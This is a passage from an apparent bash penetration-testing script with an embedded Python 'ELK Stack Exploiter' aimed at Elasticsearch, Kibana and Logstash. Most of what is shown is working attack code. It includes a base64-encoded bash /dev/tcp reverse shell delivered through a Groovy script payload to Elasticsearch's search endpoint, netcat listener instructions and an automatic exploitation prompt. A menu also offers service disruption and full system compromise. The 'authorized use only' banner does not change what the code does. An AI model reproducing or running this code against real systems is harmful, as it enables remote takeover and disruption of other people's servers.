            print(f"[!] Exploit failed: {str(e)}")
            return False
    
    def exploit_elastic_rce(self, attacker_ip, attacker_port):
        print("[*] Attempting Elasticsearch RCE exploit...")
        
        # Encode reverse shell
        rev_shell = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
        encoded_shell = base64.b64encode(rev_shell.encode()).decode()
        
        # Groovy payload
        payload = {
            "size": 1,
            "script_fields": {
                "exploit": {
                    "script": f"java.lang.Math.class.forName('java.lang.Runtime').getRuntime().exec('bash -c {{echo,{encoded_shell}}}|{{base64,-d}}|{{bash,-i}}').getText()"
                }
            }
        }
        
        print(f"[!] Start a listener with: nc -lvnp {attacker_port}")
        input("Press Enter when your listener is ready...")
        
        try:
            print("[*] Sending exploit...")
            headers = {'Content-Type': 'application/json'}
            res = self.session.post(f"http://{self.target}:{self.elastic_port}/_search", json=payload, headers=headers)
            print(f"[*] Exploit sent with status code: {res.status_code}")
            print("[*] Check your listener for a connection")
            
            return True
        except Exception as e:
            print(f"[!] Exploit failed: {str(e)}")
            return False

def main():
    parser = argparse.ArgumentParser(description="ELK Stack Exploiter")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--elastic-port", type=int, default=9200, help="Elasticsearch port (default: 9200)")
    parser.add_argument("--kibana-port", type=int, default=5601, help="Kibana port (default: 5601)")
    parser.add_argument("--logstash-port", type=int, default=9600, help="Logstash port (default: 9600)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shell")
    parser.add_argument("--attacker-port", required=True, help="Attacker port for reverse shell")
    
    args = parser.parse_args()
    
    exploiter = ELKExploiter(args.target, args.elastic_port, args.kibana_port, args.logstash_port)
    versions = exploiter.check_elk_versions()
    
    if 'kibana' in versions:
        # Prioritize Kibana exploit if version is vulnerable
        major, minor, patch = map(int, versions['kibana'].split('.'))
        if (major == 6 and minor < 4) or (major == 5 and minor <= 6 and patch <= 12):
            print("[+] Found vulnerable Kibana version")
            exploiter.exploit_kibana_lfi(args.attacker_ip, args.attacker_port)
        else:
            print("[!] Kibana version not known to be vulnerable to LFI")
    
    if 'elasticsearch' in versions:
        # Try Elasticsearch exploit if version is vulnerable
        major, minor, patch = map(int, versions['elasticsearch'].split('.'))
        if (major == 1 and minor <= 4 and patch <= 2):
            print("[+] Found vulnerable Elasticsearch version")
            exploiter.exploit_elastic_rce(args.attacker_ip, args.attacker_port)
        else:
            print("[!] Elasticsearch version not known to be vulnerable to RCE")
    
    print("[*] Exploitation attempts completed")

if __name__ == "__main__":
    main()
EOL
  chmod +x /tmp/elk_exploiter.py
  
  echo -e "${GREEN}[+] Created helper scripts for exploitation${NC}"
  echo -e "${BLUE}[*] Usage instructions:${NC}"
  echo -e "${YELLOW}1. For general ELK exploitation:${NC}"
  echo -e "   python3 /tmp/elk_exploiter.py <target_ip> --attacker-ip <your_ip> --attacker-port <your_port>"
  echo -e "${YELLOW}2. For reverse shell:${NC}"
  echo -e "   Start listener: nc -lvnp <port>"
  echo -e "   Then run: python3 /tmp/reverse_shell.py <your_ip> <your_port>"
  
  # Attempt automatic exploitation
  echo -e "\n${BLUE}[*] Do you want to attempt automatic exploitation now?${NC}"
  read -p "Enter your IP address (for reverse shell): " attacker_ip
  read -p "Enter your listener port: " attacker_port
  
  echo -e "${YELLOW}[!] Start a listener with: nc -lvnp $attacker_port${NC}"
  echo -e "${YELLOW}[!] Press Enter when your listener is ready...${NC}"
  read
  
  echo -e "${BLUE}[*] Running automatic exploitation...${NC}"
  python3 /tmp/elk_exploiter.py $target --attacker-ip $attacker_ip --attacker-port $attacker_port
}

# Main function
main() {
  # Banner and information
  echo -e "${RED}"
  echo "=========================================================="
  echo "         ELK STACK PENETRATION TESTING SCRIPT             "
  echo "      FOR EDUCATIONAL AND AUTHORIZED USE ONLY             "
  echo "=========================================================="
  echo -e "${NC}"
  
  # Check dependencies
  check_dependencies
  
  # Gather target information
  gather_target_info
  
  # Basic recon
  recon
  
  # Menu-driven attack options
  echo -e "\n${BLUE}[*] Choose an attack vector:${NC}"
  echo "1. Check for Kibana vulnerabilities"
  echo "2. Check for Elasticsearch vulnerabilities"
  echo "3. Check for Logstash vulnerabilities"
  echo "4. Service disruption options"
  echo "5. Attempt full system compromise"
  echo "6. Exit"
  
  read -p "Select an option (1-6): " attack_option
  
  case $attack_option in
    1) check_kibana_lfi ;;
    2) check_elastic_vulns ;;
    3) check_logstash_vulns ;;
    4) disable_services ;;
    5) attempt_full_compromise ;;
    6) echo -e "${YELLOW}[!] Exiting...${NC}"; exit 0 ;;
    *) echo -e "${RED}[!] Invalid option${NC}" ;;
  esac
  
  # Option to continue
  echo -e "\n${BLUE}[*] Do you want to continue with another attack vector? (y/n)${NC}"
  read continue_attack
  
  if [[ "$continue_attack" == "y" ]]; then
    main
  else
    echo -e "${GREEN}[✓] Attack session completed${NC}"
    exit 0
  fi
}

# Start the script
main
